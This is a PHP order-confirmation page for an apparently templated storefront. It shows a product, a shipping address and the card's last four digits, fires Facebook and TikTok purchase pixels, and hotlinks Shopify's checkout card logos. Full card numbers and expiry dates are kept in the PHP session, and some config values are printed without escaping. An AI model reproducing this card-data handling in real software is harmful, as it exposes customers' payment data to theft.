<?php
session_start();

// Load config and functions
$config = require __DIR__ . '/config.php';
require_once 'functions.php';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;

// Load specific store configuration if available
if ($storeId && isset($config['generated_links'][$storeId])) {
    $storeConfig = $config['generated_links'][$storeId];
    $config['store'] = $storeConfig['store'];
    $config['product'] = $storeConfig['product'];
}

// Get shipping and payment info from session for the current store
$shippingInfo = isset($_SESSION['store_shipping_info'][$storeId]) 
    ? $_SESSION['store_shipping_info'][$storeId] 
    : ($_SESSION['shipping_info'] ?? null);

$paymentInfo = isset($_SESSION['store_payment_info'][$storeId])
    ? $_SESSION['store_payment_info'][$storeId]
    : ($_SESSION['payment_info'] ?? null);

// Get card type based on number
function getCardType($number) {
    $number = preg_replace('/\D/', '', $number);
    
    if (preg_match('/^3[47]/', $number)) return 'AMEX';
    if (preg_match('/^4/', $number)) return 'VISA';
    if (preg_match('/^5[1-5]/', $number)) return 'MASTERCARD';
    if (preg_match('/^6(?:011|5[0-9]{2})/', $number)) return 'DISCOVER';
    if (preg_match('/^(5018|5020|5038|6304|6759|6761|6763)/', $number)) return 'MAESTRO';
    
    return 'Credit Card';
}

// Get last 4 digits of card
function getLastFourDigits($number) {
    $number = preg_replace('/\D/', '', $number);
    return substr($number, -4);
}

// Set default values if config is missing
if (!isset($config['store'])) {
    $config['store'] = array(
        'theme_color' => '#FFBABA',
        'name' => 'Store Name'
    );
}

if (!isset($config['product'])) {
    $config['product'] = array(
        'name' => 'Product Name',
        'price' => 0.00,
        'size' => '',
        'image' => '/img/product.jpg',
        'shipping' => array(
            'method' => 'Standard Shipping',
            'price' => 'FREE'
        )
    );
}

// Format card info
$cardType = $paymentInfo ? getCardType($paymentInfo['cardNumber']) : '';
$lastFourDigits = $paymentInfo ? getLastFourDigits($paymentInfo['cardNumber']) : '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Order Confirmed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Facebook Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '<?php echo htmlspecialchars($config['tracking']['facebook_pixel'] ?? '24000473539555555'); ?>');
    fbq('track', 'PageView');
    // Track Purchase event
    fbq('track', 'Purchase', {
        value: <?php echo getOrderTotal(); ?>,
        currency: '<?php echo htmlspecialchars($config['store']['currency']); ?>'
    });
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=<?php echo htmlspecialchars($config['tracking']['facebook_pixel'] ?? '24000473539555555'); ?>&ev=PageView&noscript=1"
    /></noscript>

    <!-- TikTok Pixel Code -->
    <?php if (!empty($config['tracking']['tiktok_pixel'])): ?>
    <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
      ttq.load('<?php echo htmlspecialchars($config['tracking']['tiktok_pixel']); ?>');
      ttq.page();
      // Track Purchase event
      ttq.track('CompletePayment', {
        content_type: 'product',
        quantity: 1,
        price: <?php echo getOrderTotal(); ?>,
        currency: '<?php echo htmlspecialchars($config['store']['currency']); ?>'
      });
    }(window, document, 'ttq');
    </script>
    <?php endif; ?>
</head>
<body class="bg-gray-50 min-h-screen">
    <div class="max-w-3xl mx-auto px-4 py-8 md:py-12">
        <!-- Success Header -->
        <div class="text-center mb-12">
            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                </svg>
            </div>
            <h1 class="text-3xl font-bold text-gray-900 mb-2">Order Confirmed!</h1>
            <p class="text-gray-600">Thank you for your purchase. We'll email you an order confirmation with details and tracking info.</p>
        </div>

        <!-- Order Summary Card -->
        <div class="bg-white rounded-lg shadow-sm border p-6 mb-8">
            <h2 class="text-xl font-semibold mb-6">Order Summary</h2>
            
            <!-- Product Details -->
            <div class="flex items-center space-x-4 mb-6 pb-6 border-b">
                <div class="relative">
                    <img src="<?php echo htmlspecialchars($config['product']['image']); ?>" 
                         alt="<?php echo htmlspecialchars($config['product']['name']); ?>" 
                         class="w-20 h-20 object-cover rounded">
                    <span class="absolute -top-2 -right-2 bg-gray-500 text-white text-xs w-5 h-5 rounded-full flex items-center justify-center">1</span>
                </div>
                <div class="flex-1">
                    <h3 class="font-medium"><?php echo htmlspecialchars($config['product']['name']); ?></h3>
                    <p class="text-sm text-gray-500">Size: <?php echo htmlspecialchars($config['product']['size']); ?></p>
                </div>
                <div class="text-right">
                    <p class="font-medium"> <?php echo formatPrice($config['product']['price']); ?></p>
                </div>
            </div>

            <!-- Shipping Address -->
            <?php if ($shippingInfo): ?>
            <div class="mb-6 pb-6 border-b">
                <h3 class="font-medium mb-3">Shipping Address</h3>
                <div class="text-gray-600">
                    <p><?php echo htmlspecialchars($shippingInfo['firstName'] . ' ' . $shippingInfo['lastName']); ?></p>
                    <p><?php echo htmlspecialchars($shippingInfo['address']); ?></p>
                    <?php if (!empty($shippingInfo['apartment'])): ?>
                    <p><?php echo htmlspecialchars($shippingInfo['apartment']); ?></p>
                    <?php endif; ?>
                    <p><?php echo htmlspecialchars($shippingInfo['city'] . ', ' . $shippingInfo['postalCode']); ?></p>
                    <p><?php echo htmlspecialchars($shippingInfo['country']); ?></p>
                    <p class="mt-2">
                        <?php echo htmlspecialchars($shippingInfo['contactInput']); ?>
                        <?php if (!empty($shippingInfo['phone'])): ?>
                        <br><?php echo htmlspecialchars($shippingInfo['phone']); ?>
                        <?php endif; ?>
                    </p>
                </div>
            </div>
            <?php endif; ?>

            <!-- Payment Method -->
            <?php if ($paymentInfo): ?>
            <div class="mb-6 pb-6 border-b">
                <h3 class="font-medium mb-3">Payment Method</h3>
                <div class="flex items-center">
                    <?php if ($cardType === 'VISA'): ?>
                    <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/visa.sxIq5Dot.svg" alt="VISA" class="h-8 mr-3">
                    <?php elseif ($cardType === 'MASTERCARD'): ?>
                    <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/mastercard.1c4_lyMp.svg" alt="MASTERCARD" class="h-8 mr-3">
                    <?php elseif ($cardType === 'AMEX'): ?>
                    <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/c1.en/assets/amex.Csr7hRoy.svg" alt="AMEX" class="h-8 mr-3">
                    <?php endif; ?>
                    <div>
                        <p class="font-medium"><?php echo htmlspecialchars($cardType); ?> ending in <?php echo htmlspecialchars($lastFourDigits); ?></p>
                        <p class="text-sm text-gray-500">Expires <?php echo htmlspecialchars($paymentInfo['expiryDate']); ?></p>
                    </div>
                </div>
            </div>
            <?php endif; ?>

            <!-- Order Total -->
            <div>
                <div class="flex justify-between mb-2">
                    <span class="text-gray-600">Subtotal</span>
                    <span><?php echo formatPrice(getProductTotal()); ?></span>
                </div>
                <div class="flex justify-between mb-2">
                    <span class="text-gray-600">Shipping</span>
                    <span><?php echo $config['product']['shipping']['price']; ?></span>
                </div>
                <div class="flex justify-between font-medium text-lg pt-4 border-t">
                    <span>Total</span>
                    <span><?php echo formatPrice(getOrderTotal()); ?></span>
                </div>
            </div>
        </div>

        <!-- Continue Shopping Button -->
        <div class="text-center">
            <a href="/<?php echo $storeId ? '?store=' . urlencode($storeId) : ''; ?>" 
               class="inline-block bg-[<?php echo $config['store']['theme_color']; ?>] text-white px-8 py-3 rounded-md font-medium hover:opacity-90 transition-colors">
                Continue Shopping
            </a>
        </div>
    </div>
</body>
</html> 